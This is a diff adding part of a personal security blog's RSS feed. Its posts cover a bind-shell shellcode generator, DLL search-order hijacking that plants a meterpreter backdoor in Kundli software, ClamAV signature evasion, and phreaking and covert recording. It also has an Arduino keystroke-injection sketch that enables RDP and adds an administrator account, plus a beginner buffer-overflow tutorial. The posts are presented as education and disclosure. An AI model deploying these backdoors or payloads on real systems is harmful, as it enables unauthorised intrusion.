+class="pl-c1">1</span>]</p>
+
+<p>fh, sh <span class="pl-k">=</span> port[:<span
+class="pl-c1">2</span>],port[<span class="pl-c1">2</span>:]</p>
+
+<p><span class="pl-k">if</span> <span class="pl-c1">len</span>(fh) <span
+class="pl-k">==</span> <span class="pl-c1">1</span>: fh <span
+class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>0<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">+</span> fh</p>
+
+<p><span class="pl-k">if</span> <span class="pl-c1">len</span>(sh) <span
+class="pl-k">==</span> <span class="pl-c1">1</span>: sh <span
+class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>0<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">+</span> sh</p>
+
+<p>_p <span class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span><span class="pl-cce">\\</span>x<span
+class="pl-c1">{0}</span><span class="pl-cce">\\</span>x<span
+class="pl-c1">{1}</span><span
+class="pl-pds">&ldquo;</span></span>.format(fh,sh)</p>
+
+<p><span class="pl-k">for</span> j,i <span class="pl-k">in</span> <span
+class="pl-c1">enumerate</span>(contents):</p>
+
+<p><span class="pl-k">if</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span><span class="pl-cce">\\</span>x22<span
+class="pl-cce">\\</span>xb8<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">in</span> i:</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Line Number :<span class="pl-pds">&ldquo;</span></span>
+<span class="pl-k">+</span> <span class="pl-c1">str</span>(j)</p>
+
+<p>contents[j] <span class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&lsquo;</span>&ldquo;<span class="pl-pds">&lsquo;</span></span> <span
+class="pl-k">+</span> _p <span class="pl-k">+</span><span
+class="pl-s"><span class="pl-pds">&lsquo;</span>&ldquo;<span
+class="pl-pds">&lsquo;</span></span></p>
+
+<p>nf <span class="pl-k">=</span> sys.argv[<span
+class="pl-c1">1</span>]<span class="pl-k">+</span><span
+class="pl-s"><span class="pl-pds">&ldquo;</span>_new.c<span
+class="pl-pds">&ldquo;</span></span></p>
+
+<p><span class="pl-k">with</span> <span class="pl-c1">open</span>(nf, <span
+class="pl-s"><span class="pl-pds">&ldquo;</span>wb<span
+class="pl-pds">&ldquo;</span></span>) <span class="pl-k">as</span> f:</p>
+
+<p>f.writelines(contents)</p>
+
+<p><span class="pl-k">import</span> os</p>
+
+<p>os.system(<span class="pl-s"><span class="pl-pds">&ldquo;</span>gcc <span
+class="pl-c1">{0}</span> -o <span class="pl-c1">{1}</span>
+-fno-stack-protector -z execstack<span
+class="pl-pds">&ldquo;</span></span>.format(nf,sys.argv[<span
+class="pl-c1">1</span>]))</p>
+
+<p>os.system(<span class="pl-s"><span class="pl-pds">&ldquo;</span>rm <span
+class="pl-c1">{0}</span><span class="pl-pds">&ldquo;</span></span>.format(nf))</p>
+
+<p> We can run the generator as shown on the following screen:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-31%2B15.09.23.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-31%2B15.09.23.png" alt="" /></a></p>
+
+<p>Following are the links to all the codes used in the exercise:</p>
+
+<ol>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/bind_shell_108.nasm" target="_blank">bind_shell_108.nasm : 108 bytes original null-free
+shellcode</a></li>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/bind_shell_80.nasm" target="_blank">bind_shell_80.nasm   :  80 bytes null-free
+shellcode</a></li>
+<li><a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/shellcode108.c" target="_blank"> shellcode108.c           :  C file for 108 bytes bind TCP
+shellcode [Generator
+Format]</a></li>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/shellcode80.c" target="_blank">shellcode80.c             :  C file for 80 bytes bind TCP
+shellcode [Generator
+Format]</a></li>
+<li><span
+class="css-truncate css-truncate-target"><a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/linux_bind_shell_generator.py" id="4bedaf2c99eabb3f9c15192b7585c691-5ce587f35458f0aa3ab60975cde933c972a8aa71" class="js-navigation-open" title="linux_bind_shell_generator.py">linux_bind_shell_generator.py : Port Wrapper for Shellcode</a></span></li>
+</ol>
+
+<p><span style="color: red;">This blog post has been created for completing
+the requirements of the SecurityTube Linux Assembly Expert
+certification:</span>
+<span style="color: red;"> </span><span
+style="color: red;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span style="color: red;"> </span><span style="color: red;">Student-ID:
+SLAE-1080</span>
+<span class="css-truncate css-truncate-target"></span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Postpone your Marriage plans and Deal with the Hack first</title>
+            <link>/posts/2017/11/postpone-your-marriage-plans-and-deal-with-the-hack-first/</link>
+            <pubDate>Thu, 30 Nov 2017 23:46:00 +0530</pubDate>
+            
+            <guid>/posts/2017/11/postpone-your-marriage-plans-and-deal-with-the-hack-first/</guid>
+            <description>If you think i am lazy with my posts, Hell Yeah! you are absolutely correct. Sometimes I feel 24-hours in a day are just not enough. I have ton of things to care about in life, things such as my family and my work, my friends who are like my family. I delivered my last session on 10th (if i remember correctly) in my very own Alma mater i.e. Lovely professional university and it was a great experience as always.</description>
+            <content type="html"><![CDATA[<p>If you think i am lazy with my posts, Hell Yeah! you are absolutely correct. Sometimes I feel 24-hours in a day are just not enough. I have
+ton of things to care about in life, things such as my family and my
+work, my friends who are like my family. I delivered my last session on 10th (if i remember correctly) in my very own Alma mater  i.e. Lovely
+professional university and it was a great experience as always. Due to the nature of audience(students), i tried keeping a little technical yet
+important topic which was <strong>DLL Search Order Hijacking</strong>. The reason
+i chose this topic over others is that this may sound interesting yet
+simple to the upcoming ninjas of my university.</p>
+
+<p>I have to admit, i keep searching about my books on the internet
+everyday, filtering them out through countries and time to check if they
+are being leaked anywhere on the internet and what i found one day was
+that being an author, i have been indexed by google with a knowledge
+graph. However, i felt disappointed seeing my age alongside my name 😞</p>
+
+<p>First time in my life, i felt like if google is pretending to be my
+mother who keeps giving me a reality check on the age and marriage
+suggestions. Things became worse when some popular matrimonial website
+started following me on twitter. Well, finally i made up my mind and
+asked my mother to sign up for some popular matrimony sites. Suddenly,
+we started receiving ton of calls and what all people required was a
+<strong>KUNDLI</strong> (This is a popular Indian document which is more powerful
+than all your certifications / Degrees/ Diplomas/ Letter of
+Recommendations) i mean this document, as soon as it gets printed
+controls your fortune, destiny, karma, sins and what not. If you are
+confused and don&rsquo;t have an idea what the hell i am talking about, this
+document is related to astrology which is used for match making.</p>
+
+<p>So, we found someone locally who can get this document printed based on
+my DOB, place of birth, name etc. Accidentally, the guy who printed was
+running the software right in front of my evil eyes which kept staring
+at his cracked and no longer supported operating system which is none
+other than the legendary Windows XP. I kept looking and thinking about
+<strong>ms08_067_netapi</strong> (which made me happy obviously). However, then
+popped a software which actually generated the book of my life(Kundli)
+and the software was Kundli Pro(Also known as Kundli for Windows).
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-kundli.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-kundli.png" alt="" /></a>
+</p>
+I came back home and downloaded this software from the internet and
+started looking for a potential vulnerability. I found some low hanging
+BOFs but i wanted to evade any possibilities of suspicion. I fired up my
+procmon (Process Monitor) and ran filters on the KUNDLI software as
+shown in the following screen:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-procmon.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-procmon.png" alt="" /></a>
+</p>
+Hmm.. Interesting. If you have no idea what DLL Search order hijacking
+is, better get your googling skills into play. Anyways, the software
+tries to load the <code>VB5.DLL</code> while running. However, the vulnerability is
+that it starts from the current folder. This means it first looks in its
+own directory which is located in Program files and then when it doesn&rsquo;t
+find one, it goes to the system32 folder and loads it. This means that
+if anyhow the software is shipped with the VB5.dll as a package. it will
+never load the other one from system32. Next, what we can do is to
+simply create a meterpreter backdoor in a <code>.dll</code> format, rename it as
+<code>VB5.dll</code> and place it in the software folder and re-run the software as
+shown in the following screen:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-dllplace.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-dllplace.png" alt="" /></a>
+</p><p align="center">
+Re-running the software will provide us with a meterpreter shell.
+However, the software will crash which may cause suspicion as shown in
+the following screen:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-error.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-error.png" alt="" /></a>
+</p>
+ At this point what we can do is to simply download the DLL file from
+some popular DLL sharing site(Original) and backdoor the original file
+though a code cave as shown in the following screen:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-Picture1.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-Picture1.png" alt="" /></a>
+</p>
+ Let&rsquo;s re-run the software and check if something changed:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-fund.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-fund.png" alt="" /></a>
+</p>
+We can see that the software loaded the DLL with ease from the current
+directory itself. Let&rsquo;s check our meterpreter handler:
+<p align="center">
+<a href="/images/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-fi.png"><img src="/images/thumbnails/2017-11-30-postpone-your-marriage-plans-and-deal-with-the-hack-first-fi.png" alt="" /></a>
+</p>
+Bang! we got the access to the target with no suspicion at all.
+Achieving this point, i could do ton of things such as:</p>
+
+<ol>
+<li>Re-Packing the software with the infected DLL file and distributing
+it over the internet</li>
+<li>Packing the software with a crypto miner and make tons of cash</li>
+<li>Cause harm to the infected people by breaching there privacy</li>
+<li>Locking their systems with a ransomware</li>
+<li>Ask my matches at JeevanSathi and Shaadi.com to install the software
+:P This could have been Fun!!!</li>
+</ol>
+
+<p>However, i choose to disclose this vulnerability right here at my blog
+and this is the exact reason why you shouldn&rsquo;t use cracked software.
+This tutorial was for educational purposes only. Please do not harm
+anyone.</p>
+
+<p><strong>References and Tools used:</strong></p>
+
+<ol>
+<li><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank">https://github.com/secretsquirrel/the-backdoor-factory</a></li>
+<li><a href="https://www.metasploit.com/" target="_blank">https://www.metasploit.com/</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
+<li><a href="https://attack.mitre.org/wiki/Technique/T1038" target="_blank">https://attack.mitre.org/wiki/Technique/T1038</a></li>
+<li>Original PPT:
+<a href="https://www.slideshare.net/nipunjaswal/hijacking-softwares-for-fun-and-profit" target="_blank">https://www.slideshare.net/nipunjaswal/hijacking-softwares-for-fun-and-profit</a></li>
+<li>For Metasploit Tutorials you can buy my books
+<a href="https://www.amazon.com/Nipun-Jaswal/e/B00OXOCXOU" target="_blank">here</a> ( This is
+self promotion :P, i think i can do that, its my blog right :P)</li>
+</ol>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Antivirus Evasion for dummies</title>
+            <link>/posts/2017/08/antivirus-evasion-for-dummies/</link>
+            <pubDate>Mon, 14 Aug 2017 00:08:00 +0530</pubDate>
+            
+            <guid>/posts/2017/08/antivirus-evasion-for-dummies/</guid>
+            <description>Long time huh? I just updated my website and i am hoping that you will like the new look and feel. I have been working recently on tons of AV solutions, trying to get the insight of how can one evade detection without using any crypters or obfuscation. Ahh, i know the topic is a bit touchy or you may think why am i discussing AV bypasses at the first place.</description>
+            <content type="html"><![CDATA[<p>Long time huh? I just updated my website and i am hoping that you will
+like the new look and feel. I have been working recently on tons of AV
+solutions, trying to get the insight of how can one evade detection
+without using any crypters or obfuscation. Ahh, i know the topic is a
+bit touchy or you may think why am i discussing AV bypasses at the first
+place. Frankly, while conducting a penetration test ( the formal name
+given to breaking into systems) we may come across plenty of protection
+mechanisms such as AVs / Firewalls and much more. Keeping in mind this
+equation i thought of sharing the most basic AV evasion techniques( Just
+to understand how AV thing work). For this specific topic, we will use
+ClamAV (Open Source and fun to play with)
+<p align="center">
+<a href="/images/2017-08-14-antivirus-evasion-for-dummies-clamav.png"><img src="/images/2017-08-14-antivirus-evasion-for-dummies-clamav.png" alt="" /></a>
+</p>
+However, the methods apply to all AV solutions(All you need to decode
+are the signatures using good unpackers).
+<strong>The Setup:</strong>
+We will be using the latest ubuntu while having ClamAV installed over
+it.</p>
+
+<p><strong>The Sample:</strong>
+For the demo, i will be using a random CVE 2010-3333 sample which is
+detected on almost every odd AV solution.</p>
+
+<p><strong>The Idea:</strong>
+Since the idea is not to obfuscate the file but to reverse the
+signatures and find what is being detected. We will keep it simple and
+make use of sigtool (comes along with ClamAV) to unpack the signatures.
+Having the decoded signatures, we can simply run a scan over the
+infected file which will let us know the exact signature causing the
+detection, in some cases, the signature will only be the hash of the
+infected file which can easily be bypassed by just appending a space to
+the document. In other cases, it may detect a pattern in the file. In
+such cases, we will see how we can find what the antivirus is looking
+for and correct it in our malicious payload. let&rsquo;s jump into the demo as
+follows:
+<p align="center">
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=fjka-uaN4kM
+" target="_blank"><img src="http://img.youtube.com/vi/fjka-uaN4kM/0.jpg"
+alt="phreaking" border="2" /></a>
+</p></p>
+
+<p>As shown in the demo, we can easily bypass signature based detections
+and patterns looked for by the AV solutions.</p>
+
+<p><strong>Note: This tutorial is for educational purposes only, the idea of such
+tutorials is to educate newbies and security enthusiasts to build
+effective signatures and get a little know-how about Antivirus
+solutions.</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Recreating a USB Rubber Ducky under $4 in India</title>
+            <link>/posts/2016/09/recreating-a-usb-rubber-ducky-under-4-in-india/</link>
+            <pubDate>Sat, 24 Sep 2016 00:30:00 +0530</pubDate>
+            
+            <guid>/posts/2016/09/recreating-a-usb-rubber-ducky-under-4-in-india/</guid>
+            <description>Holla Guys, It&amp;rsquo;s been a while I have been on my very own domain :P Anyways, today I would like to show you guys few things I have done in the past few years. I have been playing around with a lot of Arduino chips and ended up creating a clone of the USB Rubber Ducky using the keyboard libraries.  By using cheap Arduino chips I was not only able to run commands on my computer system but was able to bypass Android 4-Digit lock in less than 2 hours.</description>
+            <content type="html"><![CDATA[<p>Holla Guys,
+It&rsquo;s been a while I have been on my very own domain :P Anyways, today I
+would like to show you guys few things I have done in the past few
+years. I have been playing around with a lot of Arduino chips and ended
+up creating a clone of the USB Rubber Ducky using the keyboard
+libraries.
+<p align="center">
+<a href="/images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-arduino_logo_black-wallpaper-1280x720.jpg"><img src="/images/thumbnails/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-arduino_logo_black-wallpaper-1280x720.jpg" /></a>
+</p></p>
+
+<p>By using cheap Arduino chips I was not only able to run commands on my
+computer system but was able to bypass Android 4-Digit lock in less than
+2 hours.
+<p align="center">
+<a href="/images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-Capture_115.PNG"><img src="/images/thumbnails/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-Capture_115.PNG" alt="" /></a>
+</p>
+So how was i able to do it? The very first thing we require is
+an Arduino Pro Micro Chip. You will find it on Amazon, Ebay or anywhere
+else and it would cost around 800-900 Rupees which is a lot of money :P
+So, I chose to go with Aliexpress and got the chips for less than $4.
+Having the chip, all you need to is to use a USB - Micro Cable to
+connect your new Arduino chip to the system. For all the folks who know
+about Arduino&rsquo;s please feel free to skip one or two paragraphs. You will
+need the <a href="https://www.arduino.cc/en/Main/Software" target="_blank">Arduino IDE</a>
+(Download and install). You will also need to set your board to Arduino
+Leonardo(Compatible with Arduino Pro Micro)</p>
+
+<p>Next, all we need to do is to interpret our required functionality in
+the form of keystrokes and build a program around it.
+<code>Keyboard.press()</code> function will type the required key for us while
+<code>Keyboard.release()</code> will release a particular key. Another important
+function is <code>Keyboard.releaseAll()</code> which will release all the pressed
+keys at once. Say, <code>CTRL+SHIFT+DEL</code> pressing this combination will
+require you to press one key after the other while holding them all and
+releasing them together. Similar combinations are required for any
+combinations we want. The beauty of the Arduino is that it types in so
+fast that barely a human eye could catch(if very little delays are
+present).  Let&rsquo;s say we need to open an admin prompt; we will first
+press the left windows key, then we will type in cmd, then right
+clicking <code>cmd</code>(<code>CTRL+SHIFT+F10</code>), then a down arrow key and finally enter
+key. However, if UAC is enabled another Right Arrow Press Followed by an
+Enter is required. You can understand the functionality through the
+following image:
+<p align="center">
+<a href="./images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-gg.gif"><img src="./images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-gg.gif" alt="" /></a>
+</p>
+So, let&rsquo;s simply create an example program which will Bypass UAC, Enable
+RDP and add a user named hacker to the system as follows:</p>
+
+<pre><code> void setup() {
+ Keyboard.begin();
+ delay(3000);   
+ type(KEY_LEFT_GUI,false);
+ Keyboard.releaseAll();
+ delay(100);
+ print(F(&quot;cmd.exe&quot;));
+ delay(1000);
+ type(KEY_LEFT_CTRL,false);
+ type(KEY_LEFT_SHIFT,false);
+ type(KEY_F10,false);
+ Keyboard.releaseAll();
+ delay(200);
+ type(KEY_DOWN_ARROW,false);
+ Keyboard.releaseAll();
+ delay(200);
+ type(KEY_DOWN_ARROW,false);
+ Keyboard.releaseAll();
+ delay(200);
+ type(KEY_DOWN_ARROW,false);
+ Keyboard.releaseAll();
+ delay(500); 
+ type(KEY_RETURN,false);
+ Keyboard.releaseAll();
+ delay(2000);
+ type(KEY_LEFT_ARROW,false);
+ Keyboard.releaseAll();
+ delay(100);
+ type(KEY_RETURN,false);
+ Keyboard.releaseAll();
+ delay(1000);
+ print(F(&quot;reg add &quot;));
+ delay(1000);
+ String abc= &quot;\\&quot;;
+ print(F(&quot;\&quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\&quot;&quot;));
+ delay(1000);
+ print(F(&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;));
+ delay(2000);
+ type(KEY\_RETURN,false);
+ Keyboard.releaseAll();
+ print(F(&quot;net user hacker hacker /add&quot;));
+ delay(1000);
+ type(KEY_RETURN,false);
+ Keyboard.releaseAll();
+ delay(5000);
+ print(F(&quot;net localgroup administrators hacker /add&quot;));
+ delay(1000);
+ type(KEY_RETURN,false);
+ Keyboard.releaseAll();
+ delay(5000);
+ print(F(&quot;exit&quot;));
+ delay(1000);
+ type(KEY_RETURN,false);
+ Keyboard.releaseAll();
+ Keyboard.end();
+ }
+ void type(int key, boolean release) {
+     Keyboard.press(key);
+     if(release)
+         Keyboard.release(key);
+ }
+ void print(const __FlashStringHelper *value) {
+     Keyboard.print(value);
+ }
+ void loop(){}
+</code></pre>
+
+<p>Loading this program into the Arduino, we can backdoor anybody&rsquo;s system
+with a new user account and can remote connect to the system. However,
+using a little modification you can also obtain the IP address of the
+system as well.</p>
+
+<p>I have already created a demonstration exploiting the
+<code>CTRL+SHIFT+PRNTSCR</code> functionality at login time which can be found
+below:
+<p align="center">
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=owRznVsJonY
+" target="_blank"><img src="http://img.youtube.com/vi/owRznVsJonY/0.jpg"
+alt="phreaking" border="2" /></a></p></p>
+
+<p>Enjoy!! Hope You will like this!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Keep Spying with a Low Cost Voice Recorder</title>
+            <link>/posts/2014/12/keep-spying-with-a-low-cost-voice-recorder/</link>
+            <pubDate>Wed, 03 Dec 2014 18:16:00 +0530</pubDate>
+            
+            <guid>/posts/2014/12/keep-spying-with-a-low-cost-voice-recorder/</guid>
+            <description>Voice Recording is one of the primary aspects when it comes to Spying. Today let us discuss about ISD 1820 Voice Recording Module.  This Module works both independently as well as with Arduino, Pi Boards etc. it is quite small, say a few centimeters bigger than the SD card adapter. This module operates on 3V-5V. Starting to record, playing back can both be controlled using hardware switches as well as Boards like Arduino, Pi etc.</description>
+            <content type="html"><![CDATA[<p>Voice Recording is one of the primary aspects when it comes to Spying.
+Today let us discuss about <a href="http://www.ebay.in/itm/Voice-Recording-Module-Arduino-ARM-and-other-MCU-/111504392050?" target="_blank">ISD
+1820</a>
+Voice Recording Module.
+<p align="center">
+<a href="/images/2014-12-03-keep-spying-with-a-low-cost-voice-recorder-sku_149658_2.jpg"><img src="/images/thumbnails/2014-12-03-keep-spying-with-a-low-cost-voice-recorder-sku_149658_2.jpg" alt="" /></a>
+</p>
+This Module works both independently as well as with Arduino, Pi Boards
+etc. it is quite small, say a few centimeters bigger than the SD card
+adapter. This module operates on 3V-5V. Starting to record, playing back
+can both be controlled using hardware switches as well as Boards like
+Arduino, Pi etc.</p>
+
+<p>This module is can be used to build various projects for spying and can
+be interfaced with SIM900, Motion Sensor so on and so forth.</p>
+
+<p>A Basic Video demonstrating operations of this module can be found at:
+<p align="center">
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=e32ZCAdrwCk
+" target="_blank"><img src="http://img.youtube.com/vi/e32ZCAdrwCk/0.jpg"
+alt="phreaking" border="2" /></a></p></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Android Keypad Tones, A Perfect BlueBox!</title>
+            <link>/posts/2014/11/android-keypad-tones-a-perfect-bluebox/</link>
+            <pubDate>Wed, 19 Nov 2014 00:42:00 +0530</pubDate>
+            
+            <guid>/posts/2014/11/android-keypad-tones-a-perfect-bluebox/</guid>
+            <description>Hi, I recently found that keypad tones from android devices can act as a perfect phone phreaking blue box.  In Simple Terms: Feed in Equivalent Calling tones to the Mic of the Land Line from Android, this will allow you to call the number for whom the tones are generated for
+However, for some devices like Samsung and others, may not generate the same tones. However, for those devices, we can simply install ToneDef Application from Google Playstore for free.</description>
+            <content type="html"><![CDATA[<p>Hi, I recently found that keypad tones from android devices can act as a
+perfect phone phreaking blue box.
+<p align="center">
+<a href="/images/2014-11-19-android-keypad-tones-a-perfect-bluebox-phonephreaking1330.jpg"><img src="/images/thumbnails/2014-11-19-android-keypad-tones-a-perfect-bluebox-phonephreaking1330.jpg" alt="" /></a>
+</p>
+<strong><em>In Simple Terms: Feed in Equivalent Calling tones to the Mic of the
+Land Line from Android, this will allow you to call the number for
+whom the tones are generated for</em></strong></p>
+
+<p>However, for some devices like Samsung and others, may not generate the
+same tones. However, for those devices, we can simply install
+<a href="https://play.google.com/store/apps/details?id=com.bytestemplar.tonedef" target="_blank">ToneDef</a>
+Application from Google Playstore for free. Using this app or the
+android dialer pad itself may allow phreaking on telephone land lines.</p>
+
+<p>So many of you guys might have seen a old style phone lock that hides
+the entire keypad from a landline phone. Now, you don&rsquo;t have to bother
+about that at all. We can simply use an android app to bypass Keypad
+locks and in most cases with the ToneDef app we can simply bypass
+Pay-Phones as well.</p>
+
+<p>Have a Look at a simple demonstration using android at:
+<p align="center">
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=Snm3IzIWqls
+" target="_blank"><img src="http://img.youtube.com/vi/Snm3IzIWqls/0.jpg"
+alt="phreaking" border="2" /></a>
+</p>
+Kindly share your thoughts in the comments and if you liked the video,
+kindly give it a share.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Exploit Writing Series Tutorial 1: Buffer Overflow on Linux</title>
+            <link>/posts/2014/10/exploit-writing-series-tutorial-1-buffer-overflow-on-linux/</link>
+            <pubDate>Mon, 27 Oct 2014 21:05:00 +0530</pubDate>
+            
+            <guid>/posts/2014/10/exploit-writing-series-tutorial-1-buffer-overflow-on-linux/</guid>
+            <description>Hey folks, i have been thinking for so long to start a noob friendly series on exploit writing but never got that much time. Anyways, let&amp;rsquo;s talk about exploit writing-  So, What is an exploit? an exploit is a piece of code that takes the advantage of a vulnerable system.
+However, keeping this a noob friendly tutorial let&amp;rsquo;s make some things very clear. Firstly, an exploit may or may not work on two different application versions, may not work on two different operating systems.</description>
+            <content type="html"><![CDATA[
+
+<p>Hey folks,
+i have been thinking for so long to start a noob friendly series on
+exploit writing but never got that much time. Anyways, let&rsquo;s talk about
+exploit writing-
+<p align="center">
+<a href="/images/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-overflow.jpg"><img src="/images/thumbnails/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-overflow.jpg" alt="" /></a>
+</p></p>
+
+<h2 id="so-what-is-an-exploit">So, What is an exploit?</h2>
+
+<p>an exploit is a piece of code that takes the advantage of a vulnerable
+system.</p>
+
+<p>However, keeping this a noob friendly tutorial let&rsquo;s make some things
+very clear. Firstly, an exploit may or may not work on two different
+application versions, may not work on two different operating systems.
+Secondly, if you think you already know basics, you can leave the
+website immediately.</p>
+
+<p>Well, Throughout this series we will start from the very basic (I Mean
+it :P) this means we will take up things as soon as they appear. So, you
+don&rsquo;t have to worry about ASM, Comp. Architecture etc.</p>
+
+<h3 id="pre-requisites">Pre-Requisites</h3>
+
+<p>I already mentioned that we will take up things as soon as they appear.
+However, for this tutorial you should have a lil knowledge about C
+Programming.</p>
+
+<p>So, let&rsquo;s take up the most basic &ldquo;Stack based Buffer Overflows&rdquo; at the
+very first stage-</p>
+
+<h2 id="now-what-is-a-stack">Now, what is a stack?</h2>
+
+<p><p align="center">
+<a href="/images/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-books-20clip-20art-jixpyXdiE.png"><img src="/images/thumbnails/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-books-20clip-20art-jixpyXdiE.png" alt="" /></a>
+</p>
+We can see in the above picture that we organized every book one above
+the other. However, we can collectively say that this is a stack of
+books. Now, to build this stack, we placed the first book, then the
+other on top of it and so on until we run out of books.</p>
+
+<p>Exactly, what follows in Computer systems. We can put operands and
+operators one above the other to form a stack. This is called the
+&ldquo;<strong>Push</strong>&rdquo; operation. This also means that the first book is now at the
+bottom and the last one is at the top. This is why stack is called
+<strong>Last-in-First-Out</strong>. So, when we need to remove a book, we first need
+to remove the book at the top, this is called the &ldquo;<strong>Pop</strong>&rdquo; operation.</p>
+
+<h2 id="so-what-is-buffer-overflow">So, What is Buffer Overflow?</h2>
+
+<p>A buffer is a region which stores data temporarily and when more data
+than its capacity is supplied, it gets overflowed.</p>
+
+<p><strong>Let&rsquo;s see an example-</strong></p>
+
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+&lt;include&lt;stdlib.h&gt;
+
+ void noexec()
+ {
+ printf(&quot;this never executes&quot;);
+ exit(0);
+ }
+
+ void main(int argc, char **argv)
+ {
+ char buffer[50];
+ strcpy(buffer,argv[1]);
+ printf(buffer);
+ }
+</code></pre>
+
+<p>In the above program, we have two different functions <code>main</code> and
+<code>noexec</code>. When we run this program, it simply receives the command
+line argument, copies it into the <code>buffer</code> variable and simply prints
+it.</p>
+
+<p>Now, you might ask, why do we have <code>noexec()</code> function if we are
+not calling it any where in the program? this is because in order to
+work out the simplest buffer overflow, we will try to execute this
+function by exploiting it.</p>
+
+<p>Let&rsquo;s compile this program using the following command:</p>
+
+<pre><code>#gcc -ggdb -o rofl -fno-stack-protector expl1.c -mpreferred-stack-boundary=2
+</code></pre>
+
+<p>To compile a C program in linux, we use <code>gcc</code>, <code>-ggdb</code> option allows the
+code to be executed and listed in debugger by supplying enough
+information to the debugger, about the program, <code>-fno-stack-protector</code> option turns off stack protection mechanisms in Linux while compiling the program and <code>-mpreferred-stack-boundary=2</code> option aligns the stack
+on a 4-byte boundary and will be susceptible to crash as well. However,
+by default it&rsquo;s on 16-byte boundary.</p>
+
+<p><strong>(You can Skip the above paragraph, for now we just need to focus on
+compiling the application program)</strong></p>
+
+<p><p align="center">
+<a href="/images/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-1.png"><img src="/images/thumbnails/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-1.png" alt="" /></a>
+</p>
+Let&rsquo;s execute the program, and supply <code>50</code> A&rsquo;s, we can see that it gets
+printed, Let&rsquo;s try with <code>51</code> A&rsquo;s, <code>52</code> A&rsquo;s and <code>53</code> A&rsquo;s. We can see that
+program exited normally after outputting the supplied input. However, as
+soon as we provide <code>54</code> A&rsquo;s we get <code>Segmentation Fault</code> which denotes
+crashing of the program or we can say the buffer just overflowed. You
+might ask, we had the buffer for 50 characters but it still got executed
+at 51,52,53. This is because the input didn&rsquo;t overwrote the values fetched to the EIP register
+initially and may have overwrote other registers which didn&rsquo;t affected
+the program&rsquo;s execution.</p>
+
+<h2 id="what-is-eip">What is EIP?</h2>
+
+<p>A register which stores the address of the next instruction. Therefore,
+if we overwrite the return pointer which EIP register loads, we can have the address of our choice, our
+choice will be the next instruction to be executed by the program. This
+potentially means that we can redirect the flow of a program to anywhere
+we want.</p>
+
+<p>Let&rsquo;s open this program in GDB:
+GDB is a debugger which can allow us to view the state of the registers,
+stack, memory locations etc throughout the execution of a program(I Know
+this is the most basic tutorial and introducing GDB may not be the
